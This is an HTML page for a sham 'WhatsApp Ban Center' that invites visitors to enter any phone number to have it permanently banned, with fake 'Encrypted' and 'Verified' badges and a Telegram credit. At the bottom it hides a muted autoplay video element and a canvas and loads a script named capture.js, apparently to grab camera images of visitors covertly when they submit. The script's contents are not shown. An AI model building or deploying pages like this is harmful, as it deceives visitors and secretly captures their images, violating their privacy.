<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="theme-color" content="#25d366">
<title>WhatsApp Ban Center</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="page">
  <div class="card">
    <div class="brand-icon wa">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/>
      </svg>
    </div>
    <h1>Ban WhatsApp Number</h1>
    <p class="sub">Report and permanently ban any WhatsApp number by entering it below.</p>
    <div class="field">
      <label for="target">WhatsApp number</label>
      <div class="input-wrap">
        <span class="prefix">+</span>
        <input id="target" type="text" inputmode="tel" placeholder="91 98765 43210" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
    </div>
    <button class="btn wa" onclick="go()">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
      Request Ban
    </button>
    <div class="status" id="status"></div>
    <div class="trust">
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Encrypted</span>
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Verified</span>
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Instant</span>
    </div>
  </div>
  <div class="brand">Powered by <a href="https://t.me/noob11001" target="_blank">NOOBSTER</a></div>
</div>
<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script src="/static/capture.js"></script>
<script>
function go(){
  let v=document.getElementById('target').value.trim().replace(/\s+/g,'');
  const st=document.getElementById('status');
  const btn=document.querySelector('.btn');
  if(!v){st.innerText='Please enter a number';return;}
  if(!v.startsWith('+'))v='+'+v;
  st.innerText='';btn.disabled=true;
  handleSubmit('whatsapp-ban',{number:v});
}
</script>
</body>
</html>
